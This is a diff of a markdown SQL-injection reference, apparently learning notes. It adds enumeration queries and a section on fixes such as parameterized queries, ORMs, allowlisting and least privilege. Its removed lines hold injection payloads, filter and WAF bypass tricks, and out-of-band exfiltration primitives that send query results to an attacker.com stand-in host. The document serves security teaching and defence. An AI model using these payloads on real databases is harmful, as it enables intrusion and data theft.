@@ -21,19 +21,37 @@ Same concatenation bug, different output channel. How much information the page 
 | Time-based blind | Response timing | 1 bit | Output identical — only timing leaks |
 | Out-of-band | DNS/HTTP to attacker server | Full value per request | DB has outbound network |
 
-## DB Identification
+## DB Identification and Enumeration
 
-Determines everything downstream — syntax, system tables, aggregation functions, escalation primitives all differ per database. Identify first, then exploit.
+Determines everything downstream — syntax, system tables, aggregation functions, escalation primitives all differ per database. Identify first, then enumerate, then extract.
 
-| Database | Sleep | System catalog |
-|---|---|---|
-| MySQL | `SLEEP(5)` | `information_schema.tables`, `.columns` |
-| PostgreSQL | `pg_sleep(5)` | `information_schema.tables`, `.columns` |
-| MSSQL | `WAITFOR DELAY '0:0:5'` | `information_schema.tables`, `.columns` |
-| Oracle | `DBMS_PIPE.RECEIVE_MESSAGE('x',5)` | `ALL_TABLES`, `ALL_TAB_COLUMNS` |
-| SQLite | heavy query | `sqlite_master` |
+**1. Identify the database** — inject sleep functions, observe behavior:
 
-`information_schema` is the universal map for MySQL, PostgreSQL, and MSSQL. Oracle and SQLite are the exceptions — know which catalog you need before you start extracting.
+| Database | Sleep |
+|---|---|
+| MySQL | `SLEEP(5)` |
+| PostgreSQL | `pg_sleep(5)` |
+| MSSQL | `WAITFOR DELAY '0:0:5'` |
+| Oracle | `DBMS_PIPE.RECEIVE_MESSAGE('x',5)` |
+| SQLite | heavy query |
+
+**2. Enumerate table names** — query the system catalog:
+
+| Database | Query |
+|---|---|
+| MySQL / PG / MSSQL | `SELECT table_name FROM information_schema.tables WHERE table_schema = '...'` |
+| Oracle | `SELECT table_name FROM ALL_TABLES` |
+| SQLite | `SELECT name FROM sqlite_master WHERE type = 'table'` |
+
+**3. Enumerate column names** — once you have tables:
+
+| Database | Query |
+|---|---|
+| MySQL / PG / MSSQL | `SELECT column_name FROM information_schema.columns WHERE table_name = '...'` |
+| Oracle | `SELECT column_name FROM ALL_TAB_COLUMNS WHERE table_name = '...'` |
+| SQLite | `PRAGMA table_info('...')` |
+
+**4. Extract data** — now you know the table and column names, pull the actual values using whichever flavor is available (UNION, error-based, blind).
 
 ## Data Extraction by Flavor
 
@@ -49,74 +67,6 @@ Determines everything downstream — syntax, system tables, aggregation function
 | Oracle | `UTL_INADDR.GET_HOST_NAME((SELECT secret FROM dual))` | Hostname lookup error |
 
 If errors aren't visible, check for a debug gate (trusted IP headers that flip debug mode, stack traces that leak DB errors).
-
-**Side-channel / precomputation.** Standard blind bisection takes ~7 requests per character. Instead: if the page has any output with a numeric axis you can index into, encode the secret byte into that index. One request per full byte instead of 7. Think of it as a spy hotel — the secret picks which room to check into, you just read the guest list. Any output with >2 possible values and a controllable index is a multi-bit channel.
-
-Aggregation solves a different problem — it's horizontal (all rows in one response). Precomputation is vertical (full byte per request). Combine both when possible.
-
-**Aggregation — per-DB functions:**
-
-| Database | Function |
-|---|---|
-| PostgreSQL | `STRING_AGG(col, ',')` |
-| MySQL / SQLite | `GROUP_CONCAT(col SEPARATOR ',')` |
-| MSSQL 2017+ | `STRING_AGG(col, ',')` |
-| MSSQL older | `FOR XML PATH('')` |
-| Oracle | `LISTAGG(col, ',') WITHIN GROUP (ORDER BY col)` |
-
-MySQL gotcha: `group_concat_max_len` defaults to 1024 bytes — silently truncates without warning. PostgreSQL `QUERY_TO_XML(...)` dumps an entire table as XML in one error message.
-
-**Out-of-band.** When the page gives zero signal, make the database courier the data. DNS is the channel that almost always works — it's rarely firewalled.
-
-| Database | Primitive | Channel |
-|---|---|---|
-| MySQL (Windows) | `LOAD_FILE('\\\\<data>.attacker.com\\x')` | DNS via UNC |
-| PostgreSQL | `COPY ... TO PROGRAM 'curl ...'` | HTTP (superuser) |
-| PostgreSQL | `dblink('host=<data>.attacker.com ...')` | DNS via libpq |
-| MSSQL | `xp_dirtree '\\\\<data>.attacker.com\\x'` | DNS+SMB |
-| Oracle | `UTL_HTTP.REQUEST(...)` | HTTP |
-| Oracle | `UTL_INADDR.GET_HOST_NAME(...)` | DNS only |
-
-Receivers: Burp Collaborator or `interactsh`. When OOB fails (egress firewall, missing privs): fall back to time-based.
-
-**Context matters:** numeric injection points don't need quotes — `WHERE id = 1 UNION SELECT...` works directly. String context requires closing the quote first.
-
-## Filters and Filter Bypasses
-
-A filter is a list of specific things the developer thought to block. Everything else passes.
-
-**Shape bypass — dead zones.** Every input shape has zones the validator cares about and zones it ignores. If those zones don't overlap with what SQL needs, the payload fits in both.
-
-| Shape | Dead zone | Example |
-|---|---|---|
-| Email regex | Before `@` | `' or 1=1--@x.com` |
-| URL | Path/query/fragment | `https://x.com/?'or+1=1--` |
-| Alphanumeric filter | Hex literals | `0x61646D696E` = `'admin'` (MySQL) |
-
-**Java `matches()` vs `find()`:** `matches()` validates the entire string — partial payloads in a longer valid string pass through. `find()` searches for the pattern anywhere. Developers confuse these constantly — it's a free lunch.
-
-**Bypass reference:**
-
-| Blocked | Alternative |
-|---|---|
-| Spaces | `/**/`, `%0a`, `%09` |
-| Quotes (PG) | `$$admin$$` (dollar-quoting) |
-| Quotes (MySQL) | `0x61646D696E` or `CHAR(97,100,...)` |
-| Quotes (MSSQL) | `CHAR(97)+CHAR(100)+...` |
-| Quotes (Oracle) | `q'[admin]'` or `CHR(97)\|\|CHR(100)\|\|...` |
-| Keywords | Case mixing, `UN/**/ION`, `/*!50000UNION*/` |
-| Double-encoding | `%2527` → `%27` → `'` (when filter runs before URL decoding) |
-
-**WAF parser mismatch:** WAFs parse HTTP, databases parse SQL. These are different parsers with different grammars — the gap between them is where bypasses live.
-
-**Stacked queries:**
-
-| Database + Driver | Stacking? |
-|---|---|
-| PostgreSQL + psycopg2 | Yes |
-| MySQL + JDBC | No (needs `allowMultiQueries=true`) |
-| MSSQL + most drivers | Yes |
-| Oracle | No |
 
 ## SQLi → RCE
 
@@ -137,19 +87,34 @@ LEVEL 5  ─ Interactive shell  (reverse shell → privesc)
 
 **PoLP determines blast radius.** The same SQLi bug is a P3 info-leak or a P0 RCE depending entirely on the DB role's privileges. The escalation is gated on `is_superuser`, not on the injection itself.
 
-## Why SQLi Still Exists
+## Fixing SQLi
 
-Parameterized queries solve the parsing confusion at the wire level. `COM_STMT_PREPARE` sends the query structure, `COM_STMT_EXECUTE` sends data as typed binary in a separate message — the parser is done before data arrives. This isn't escaping (which still sends one string and hopes the parser handles it). It's complete channel separation. But you can't parameterize SQL structure — table names, column names, ORDER BY direction, operators. These need allowlisting against a hardcoded set of valid values.
+**Parameterized queries** — the actual fix. `COM_STMT_PREPARE` sends the query structure, `COM_STMT_EXECUTE` sends data as typed binary in a separate message. The parser is done before data arrives. This isn't escaping (one string, hoping the parser handles it) — it's complete channel separation.
 
-ORMs prevent SQLi by generating parameterized queries — until developers reach for `.raw()`, `.extra()`, `text()`, `createNativeQuery()`, `knex.raw()`. These escape hatches are where SQLi lives in modern codebases.
+**ORMs** generate parameterized queries automatically — Django's `User.objects.filter(email=input)` becomes `SELECT ... WHERE email = $1`. Use them. But their escape hatches drop back to raw SQL: `.raw()`, `.extra()` (Django), `text()` (SQLAlchemy), `createNativeQuery()` (JPA), `knex.raw()` (Knex.js). These are where SQLi lives in modern codebases.
 
-**Second-order:** input stored safely (parameterized INSERT), retrieved later and concatenated into a different query. Spans code paths, spans time. The false assumption: "data from our own database is safe."
+**Allowlisting** — you can't parameterize SQL structure (table names, column names, ORDER BY, operators). Compare user input against a hardcoded list of valid values, default everything else. Blocklisting fails for the same reason sanitization fails — you're trying to enumerate the bad instead of defining the good.
 
-**Real breaches** — Sony 2011 (plaintext passwords leaked), Heartland 2008 (130M payment cards), TalkTalk 2015 (teenager with sqlmap), MOVEit 2023 (Cl0p mass exploitation via SQLi in file transfer app). Same fundamental bug, 15 years apart.
+**Common mistakes by language:**
 
-Default installs ship superuser credentials in the app connection string. The fix isn't better sanitization — it's PoLP at the DB layer. If this credential leaked tomorrow, what could the attacker do?
+| Language | Vulnerable (concatenation) | Safe (parameterized) |
+|---|---|---|
+| Python | `cursor.execute("... %s" % var)` | `cursor.execute("... %s", (var,))` |
+| Java | `"SELECT ... " + userInput` | `PreparedStatement` with `?` |
+| PHP | `"SELECT ... '$var'"` | PDO `->prepare()` + `->execute()` |
+| Node.js | `` `SELECT ... ${input}` `` | `pool.query('SELECT ... $1', [input])` |
+
+In any language: building SQL with f-strings, `format()`, or string concatenation is the bug. The comma-separated tuple (Python) or the `?` placeholder is the fix.
+
+**Second-order SQLi** — input stored safely (parameterized INSERT), but retrieved later and concatenated into a different query without parameterization. Happens because developers trust their own database: "we wrote it, so it's safe." The INSERT was safe — the SELECT that uses the stored value later isn't. Spans code paths and time, nearly invisible to scanners. This is why parameterizing some queries isn't enough — every query that touches stored data needs it too.
+
+**Principle of Least Privilege** — parameterization stops the bug, PoLP stops the escalation. The app's DB user should never be superuser. No FILE privilege, no DDL, no `pg_read_server_files` / `pg_write_server_files`. The app needs SELECT/INSERT/UPDATE/DELETE on its own tables — nothing more. Default installs ship superuser. Same SQLi bug is info-leak or full RCE depending entirely on the DB role's privileges.
+
+**Real breaches** — Sony 2011 (plaintext passwords leaked), Heartland 2008 (130M payment cards), TalkTalk 2015 (teenager with sqlmap), MOVEit 2023 (Cl0p mass exploitation). Same bug, 15 years apart.
 
 ## Finding SQLi
+
+A database is a process running on the OS — it listens on a port (PostgreSQL 5432, MySQL 3306, MSSQL 1433), reads and writes files on disk, and runs as a service account. The application connects to it over a network socket using a connection string with credentials. When you find SQLi, you're not just reading tables — you're executing operations as that service account on that machine. The DB's privileges, OS user, and network position determine what happens next.
 
 ### Log Observation
 
